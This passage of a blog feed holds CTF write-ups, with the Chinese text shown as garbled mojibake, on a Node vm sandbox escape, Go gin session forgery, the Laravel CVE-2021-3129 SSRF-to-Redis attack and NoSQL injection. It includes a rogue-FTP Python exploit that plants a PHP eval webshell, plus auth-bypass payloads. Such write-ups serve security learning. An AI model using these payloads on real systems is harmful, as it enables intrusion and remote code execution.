æ—¶å€™éš”ç¦»å½“å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œé¿å…è¢«æ¶æ„ä»£ç æ”»å‡»ï¼Œä½†å®é™…ä¸Švmæ²™ç®±ä¹Ÿå­˜åœ¨å®‰å…¨æ¼æ´ã€‚</p><h1 id="vmæ²™ç®±"><a href="#vmæ²™ç®±" class="headerlink" title="vmæ²™ç®±"></a>vmæ²™ç®±</h1><p>VMæ¨¡å—åŒ…å«äº†ä¸‰ä¸ªå¸¸ç”¨çš„æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºç‹¬ç«‹è¿è¡Œçš„æ²™ç®±ä½“åˆ¶ï¼Œå¦‚ä¸‹ä¸‰ä¸ªæ–¹æ³•ï¼š</p><p><code>vm.runInContext,vm.runInNewContext,vm.runInThisContext</code></p><p>æ­¤æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„æ²™ç®±è¿è¡Œç©ºé—´ï¼Œcodeå†…çš„ä»£ç å¯ä»¥è®¿é—®å¤–éƒ¨çš„globalå¯¹è±¡ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®å…¶ä»–å˜é‡.è€Œä¸”codeå†…éƒ¨globalä¸å¤–éƒ¨å…±äº«</p><p><img src="https://img-blog.csdnimg.cn/20190320113225298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZlbmdkaWppYW5n,size_16,color_FFFFFF,t_70" alt="img"></p><p>å…·ä½“å¯ä»¥çœ‹çœ‹æ–‡æ¡£<a href="http://nodejs.cn/api/vm.html">http://nodejs.cn/api/vm.html</a></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>å…ˆçœ‹ä¸€ä¸‹ç®€å•çš„é€ƒé€¸</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;goin&#x27;</span>);<br>vm.runInContext(<span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;out&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>ä¸Šè¿°ä»£ç åœ¨ç¬¬ä¸‰è¡Œç»“æŸäº†ä¸»ç¨‹åºè¿è¡Œï¼Œå¹¶ä¸”æŠ¥é”™ã€‚</p><p><img src="https://img-blog.csdnimg.cn/7688fc4098534439857382179e98c1a2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="vm2æ²™ç®±é€ƒé€¸"><a href="#vm2æ²™ç®±é€ƒé€¸" class="headerlink" title="vm2æ²™ç®±é€ƒé€¸"></a>vm2æ²™ç®±é€ƒé€¸</h1><p>å‚è€ƒï¼š<a href="https://prontosil.top/posts/9c09dcd4/">https://prontosil.top/posts/9c09dcd4/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¥¥äº‘æ¯java</title>
    <link href="/2021/10/07/2021-10-%E7%A5%A5%E4%BA%91%E6%9D%AFjava/"/>
    <url>/2021/10/07/2021-10-%E7%A5%A5%E4%BA%91%E6%9D%AFjava/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>javaweb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¾ŠåŸæ¯</title>
    <link href="/2021/09/30/2021-10-%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/09/30/2021-10-%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="checkin-go"><a href="#checkin-go" class="headerlink" title="checkin_go"></a>checkin_go</h1><p>goæ¡†æ¶ç¬¬ä¸€æ¬¡é‡åˆ°ã€‚æ­äº†ä¸‹goç¯å¢ƒé¡ºä¾¿å­¦äº†ä¸€ä¸‹åŸºæœ¬è¯­æ³•ã€‚</p><p>å®¡è®¡æºç å¯ä»¥å‘ç°ï¼Œå‡ºé¢˜äººç”¨äº†<code>gin</code>æ¡†æ¶ï¼Œå¯ç”¨äº†åŸºäºcookieçš„sessionã€‚mianå‡½æ•°é‡Œé¢åŠ äº†å‡ ä¸ªè·¯ç”±ï¼Œå®¡è®¡ä¸€ä¸‹å…³é”®çš„ä¸­é—´ä»¶å¤„ç†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/dcd4373cc1b44431b97916d9b15cf51a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹    </p><p>é»˜è®¤ç•Œé¢éœ€è¦ç™»å½•å’Œç»å…¸ç»•è¿‡hashéªŒè¯ã€‚ä½†è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œä¸èƒ½adminç™»å½•ä½†åé¢éœ€è¦ä»¥adminèº«ä»½ä¹°flagã€‚æ‰€ä»¥è¿™é‡Œçš„æ€è·¯æ˜¯ä¼ªé€ sessionã€‚</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20210922190932821.png" alt="image-20210922190932821"></p><p>ä¼ªé€ sessionå¯è¡Œè¿˜æœ‰ä¸€ä¸ªåŸå› å°±æ˜¯goè¯­è¨€ä¸‹<code>math/rand</code>åº“ä¸­randå‡½æ•°å¦‚æœæ²¡æœ‰æŒ‡å®šå¯†é’¥ï¼Œåªæ˜¯æŒ‡å®šäº†è¾“å‡ºé•¿åº¦ï¼Œé»˜è®¤çš„è¾“å‡ºç»“æœæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åœ¨æœ¬åœ°è·‘æºç æ‹¿cookieæ¥è¿›è¡Œä¼ªé€ ã€‚ä¸‹ä¸€å…³å°±æ˜¯ä¹°flagï¼Œä½†æ˜¯è‡ªå·±åªæœ‰5000ï¼Œä¹°flagè¦ä¸¤ä¸‡ï¼Œè¿™é‡Œä¸¤ä¸ªæ€è·¯ï¼Œä¸€ä¸ªæ˜¯æ•´æ•°æº¢å‡ºå°†flagä»·æ ¼å‡ä¸º0ï¼Œå¦ä¸€ä¸ªæ˜¯åœ¨æœ¬åœ°å°†<code>checkNowMoney</code>è®¾ç½®ç­‰äº<code>checkPlayerMoney</code>ï¼Œç„¶åæ‹¿cookieã€‚</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-comment">//ä¼ªé€ cookie</span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;math/rand&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>storage := cookie.NewStore(randomChar(<span class="hljs-number">16</span>))<br>r.Use(sessions.Sessions(<span class="hljs-string">&quot;o&quot;</span>, storage))<br>r.GET(<span class="hljs-string">&quot;/a&quot;</span>, cookieHandler)<br>r.Run(<span class="hljs-string">&quot;127.0.0.1:20702&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// func cookieHandler(c *gin.Context) &#123;</span><br><span class="hljs-comment">// s := sessions.Default(c)</span><br><span class="hljs-comment">// s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="hljs-comment">// s.Save()</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">cookieHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>s := sessions.Default(c)<br><span class="hljs-comment">//s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;uname&quot;))</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;nowMoney&quot;))</span><br>s.Set(<span class="hljs-string">&quot;nowMoney&quot;</span>, <span class="hljs-number">5000</span>)<br><span class="hljs-comment">//fmt.Println(s.Get(&quot;playerMoney&quot;))</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;checkNowMoney&quot;))</span><br>s.Set(<span class="hljs-string">&quot;checkNowMoney&quot;</span>, s.Get(<span class="hljs-string">&quot;checkPlayerMoney&quot;</span>))<br><span class="hljs-comment">//fmt.Println(s.Get(&quot;checkPlayerMoney&quot;))</span><br>s.Save()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randomChar</span><span class="hljs-params">(l <span class="hljs-keyword">int</span>)</span> []<span class="hljs-title">byte</span></span> &#123;<br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, l)<br>rand.Read(output)<br><span class="hljs-keyword">return</span> output<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4aa4f21ebdf643e3be9df6440818c414.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™ä¸ªé¢˜å…¶å®å€Ÿé‰´äº†wmctfçš„ä¸€ä¸ªgoé¢˜ï¼š<a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/</a></p><h1 id="Cross-The-Side"><a href="#Cross-The-Side" class="headerlink" title="Cross The Side"></a>Cross The Side</h1><p>Laravel v8.26.1 (PHP v7.4.15ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-3129ï¼‰</p><p>å½“Laravelå¼€å¯äº†Debugæ¨¡å¼æ—¶ï¼Œç”±äºLaravelè‡ªå¸¦çš„Ignition ç»„ä»¶å¯¹file_get_contents()å’Œfile_put_contents()å‡½æ•°çš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘èµ·æ¶æ„è¯·æ±‚ï¼Œæ„é€ æ¶æ„Logæ–‡ä»¶ç­‰æ–¹å¼è§¦å‘Pharååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘ç”¨è¿™ä¸ªæ‰“çš„æ—¶å€™ä¸€ç›´æŠ¥é”™phpå†…å­˜è€—å°½ï¼Œåº”è¯¥æ˜¯ç”±äºè¯¥ç½‘ç«™çš„æ—¥å¿—æ–‡ä»¶å¤ªå¤§ï¼Œè¶…å‡ºå†…å­˜ï¼Œæ— æ³•è¿›è¡Œåˆ©ï¼Œä¼°è®¡æ˜¯phpiniçš„é…ç½®ä¸åŒä¸“é—¨é™åˆ¶äº†è¿™ç§æ–¹æ³•ï¼Œå¯æƒœæ²¡æœ‰çœ‹åˆ°ç½‘ä¸Šè¿˜æœ‰ä¸€ç§åšæ³•ï¼Œå¯ä»¥è”åˆssrfæ‰“å†…ç½‘æœåŠ¡ã€‚</p><p>è¿™é‡Œä¿¡æ¯æœé›†çš„æ—¶å€™æ˜¯å¯ä»¥çœ‹åˆ°dump.rdbï¼Œæç¤ºäº†å¼€å¯äº†redisæœåŠ¡ï¼Œè¿™é‡Œå°±æ˜¯å¯ä»¥ç”¨<code>file_get_contents</code>å’Œ<code>file_get_contents</code>æ¥æ‰“redisäº†ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°ä¸æ”¯æŒgopheråè®®ï¼Œè¿™é‡Œé‡‡ç”¨ftpåè®®ï¼Œä¸Šä¼ æ–‡ä»¶æ—¶è¯·æ±‚æˆ‘ä»¬èµ·çš„æ¶æ„æœåŠ¡å™¨ï¼Œå‘Šè¯‰å®¢æˆ·ç«¯è·å–æ•°æ®çš„ipå’Œç«¯å£å»ä¸‹è½½æ•°æ®ï¼Œ<code>file_put_contents</code>æ—¶å†å°†ipå’Œç«¯å£é‡å®šå‘åˆ°å†…ç½‘çš„redisæœåŠ¡ï¼Œç„¶åå‘é€æˆ‘ä»¬çš„payloadæ¶æ„æ•°æ®ï¼Œè¿™æ ·å°±å®ç°äº†ssrfè·å–shellã€‚</p><p>å¤§è‡´è¿‡ç¨‹å¦‚å›¾</p><p><img src="https://img-blog.csdnimg.cn/72f52eda18cc4008ad18ece1d48c2085.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è´´ä¸€ä¸‹exp,ftpçŠ¶æ€ç å¯å‚è€ƒ</p><p><a href="https://blog.csdn.net/qq981378640/article/details/51254177">https://blog.csdn.net/qq981378640/article/details/51254177</a></p><p><a href="http://www.hackdig.com/06/hack-372823.htm">http://www.hackdig.com/06/hack-372823.htm</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = unquote(<span class="hljs-string">&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B123%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span>)<br>payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>port = <span class="hljs-number">23</span><br>sk = socket.socket()<br>sk.bind((host, port))<br>sk.listen(<span class="hljs-number">5</span>)<br><span class="hljs-comment"># ftpè¢«åŠ¨æ¨¡å¼çš„passvie port,ç›‘å¬åˆ°1234</span><br>sk2 = socket.socket()<br>sk2.bind((host, <span class="hljs-number">1234</span>))<br>sk2.listen()<br><span class="hljs-comment"># è®¡æ•°å™¨ï¼Œç”¨äºåŒºåˆ†æ˜¯ç¬¬å‡ æ¬¡ftpè¿æ¥</span><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    conn, address = sk.accept()<br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># USER aaa\r\n  å®¢æˆ·ç«¯ä¼ æ¥ç”¨æˆ·å</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;220 ready\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 ready\n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># TYPE I\r\n  å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯ä»¥ä»€ä¹ˆæ ¼å¼ä¼ è¾“æ•°æ®ï¼ŒTYPE Iè¡¨ç¤ºäºŒè¿›åˆ¶ï¼Œ TYPE Aè¡¨ç¤ºæ–‡æœ¬</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;215 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># SIZE /123\r\n  å®¢æˆ·ç«¯è¯¢é—®æ–‡ä»¶/123çš„å¤§å°</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;213 3 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;300 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># EPSV\r\n&#x27;</span><br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># PASV\r\n  å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯è¿›å…¥è¢«åŠ¨è¿æ¥æ¨¡å¼</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 192,168,160,129,4,210\n&quot;</span>)  <span class="hljs-comment"># æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯éœ€è¦åˆ°å“ªä¸ªip:portå»è·å–æ•°æ®,ip,portéƒ½æ˜¯ç”¨é€—å·éš”å¼€ï¼Œå…¶ä¸­ç«¯å£çš„è®¡ç®—è§„åˆ™ä¸ºï¼š4*256+210=1234</span><br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,24,235\n&quot;</span>)  <span class="hljs-comment"># ç«¯å£è®¡ç®—è§„åˆ™ï¼š24*256+235=9000</span><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># ç¬¬ä¸€æ¬¡è¿æ¥ä¼šæ”¶åˆ°å‘½ä»¤RETR /123\r\nï¼Œç¬¬äºŒæ¬¡è¿æ¥ä¼šæ”¶åˆ°STOR /123\r\n</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;125 \n&quot;</span>) <span class="hljs-comment"># å‘Šè¯‰å®¢æˆ·ç«¯å¯ä»¥å¼€å§‹æ•°æ®é“¾æ¥äº†</span><br>        <span class="hljs-comment"># æ–°å»ºä¸€ä¸ªsocketç»™æœåŠ¡ç«¯è¿”å›æˆ‘ä»¬çš„payload</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å»ºç«‹è¿æ¥!&quot;</span>)<br>        conn2, address2 = sk2.accept()<br>        conn2.send(payload)<br>        conn2.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ–­å¼€è¿æ¥!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;150 \n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))<br>        exit()<br>    <span class="hljs-comment"># ç¬¬ä¸€æ¬¡è¿æ¥æ˜¯ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦å‘Šè¯‰å®¢æˆ·ç«¯ä¸‹è½½å·²ç»ç»“æŸ</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;226 \n&quot;</span>)<br>    conn.close()<br>    count += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>ä¸‹ç¯‡å†æ€»ç»“ä¸‹ftpæ‰“mysqlæ‰“redisç­‰ç­‰æ”»å‡»ã€‚</p><h1 id="Only-4"><a href="#Only-4" class="headerlink" title="Only 4"></a>Only 4</h1><p>é¢„æœŸè§£éœ€è¦æ‰«åˆ°<code>searlize.php</code>æ˜¾ç„¶æœ‰ç‚¹æ‰¯</p><p>éé¢„æœŸæ˜¯æ—¥å¿—æ–‡ä»¶åŒ…å«getshellã€‚ç›´æ¥åŒ…å«PHP_SESSION_UPLOAD_PROGRESSã€‚sessionæ–‡ä»¶åœ¨/var/lib/php5/sess_rayiã€‚è„šæœ¬å°±ä¸è´´äº†</p><h1 id="No-sql"><a href="#No-sql" class="headerlink" title="No sql"></a>No sql</h1><p>cmsæ¡†æ¶æ¥æºäº<a href="http://cn-sec.com/archives/335315.html">http://cn-sec.com/archives/335315.html</a> è€ƒå¯Ÿnosqlæ³¨å…¥</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nosql</title>
    <link href="/2021/09/20/2021-10-nosql%E6%B3%A8%E5%85%A5(1)/"/>
    <url>/2021/09/20/2021-10-nosql%E6%B3%A8%E5%85%A5(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Mogodbæ•°æ®åº“"><a href="#Mogodbæ•°æ®åº“" class="headerlink" title="Mogodbæ•°æ®åº“"></a>Mogodbæ•°æ®åº“</h1><p>åœ¨ <a href="https://cloud.tencent.com/product/cdb?from=10680">MySQL</a> ä¸­ï¼Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å‡ ä¸ªæœ€å¸¸è§çš„æ¦‚å¿µæ˜¯æ•°æ®åº“ (Database)ã€è¡¨ (Table)ã€å­—æ®µ (Column)ã€è®°å½• (Record)ã€ç´¢å¼• (Index)ï¼Œè¿™äº›æœ¯è¯­æ˜ å°„åˆ° MongoDB ä¸­å¤§æ¦‚ç­‰ä»·äºæ•°æ®åº“ (Database)ã€é›†åˆ (Collection)ã€åŸŸ (Field)ã€æ–‡æ¡£ (Document)ã€ç´¢å¼• (Index)ã€‚ä¸€äº›åŸºæœ¬æ“ä½œå¯ä»¥çœ‹æ–‡æ¡£</p><h1 id="ç»å…¸æ³¨å…¥æ–¹å¼"><a href="#ç»å…¸æ³¨å…¥æ–¹å¼" class="headerlink" title="ç»å…¸æ³¨å…¥æ–¹å¼"></a>ç»å…¸æ³¨å…¥æ–¹å¼</h1><h3 id="æ°¸çœŸæ³¨å…¥"><a href="#æ°¸çœŸæ³¨å…¥" class="headerlink" title="æ°¸çœŸæ³¨å…¥"></a>æ°¸çœŸæ³¨å…¥</h3><p>åˆ©ç”¨çš„åŸç†ç±»ä¼¼äºä¸‡èƒ½å¯†ç ï¼Œä½¿æŸ¥è¯¢çš„åˆ¤å®šç»“æœæ°¸è¿œä¸ºtrue</p><p>ä¾‹å¦‚å½“ä¸ºå¦‚ä¸‹æŸ¥è¯¢è¯­å¥æ—¶ï¼Œå½“getä¼ å‚ä¸º<code>?username[$ne]=1&amp;password[$ne]=1</code>åˆ™ä¼ å…¥mogodbåæˆä¸ºäº†ä¸€ä¸ªæ¡ä»¶æŸ¥è¯¢ã€‚å³ä¸ºæŸ¥è¯¢usernameå’Œpasswordä¸ç­‰äº1çš„æ•°æ®ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„æ¡ä»¶æ“ä½œç¬¦ã€‚</p><p><img src="https://img-blog.csdnimg.cn/36584b6cdcc5432a80bfeac368c97e18.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># æŸ¥è¯¢è¯­å¥</span><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;uname&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<br>    <span class="hljs-string">&#x27;pwd&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>));<br><span class="hljs-comment"># æ‰§è¡Œè¯­å¥</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure><h3 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“åœ¨ SQL æ—¶ä»£æ‹¼æ¥å­—ç¬¦ä¸²å®¹æ˜“é€ æˆ SQL æ³¨å…¥ï¼ŒNoSQL ä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ï¼Œä½†æ˜¯ç°åœ¨æ— è®ºæ˜¯ PHP çš„ MongoDB driver è¿˜æ˜¯ node.js çš„ mongoose éƒ½å¿…é¡»è¦æ±‚æŸ¥è¯¢æ¡ä»¶å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€… query å¯¹è±¡äº†ï¼Œå› æ­¤ç®€å•çœ‹ä¸€ä¸‹å°±å¥½ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span> query =<span class="hljs-string">&quot;&#123; username: &#x27;&quot;</span> + <span class="hljs-variable">$username</span> + <span class="hljs-string">&quot;&#x27;, password: &#x27;&quot;</span> + <span class="hljs-variable">$password</span> + <span class="hljs-string">&quot;&#x27; &#125;&quot;</span>  <span class="hljs-comment">#æŸ¥è¯¢è¯­å¥</span><br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œæ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">username=admin<span class="hljs-string">&#x27;,&#123;$or:[&#123;&#125;,&#123;&#x27;</span>a<span class="hljs-string">&#x27;:&#x27;</span>a&amp;password=<span 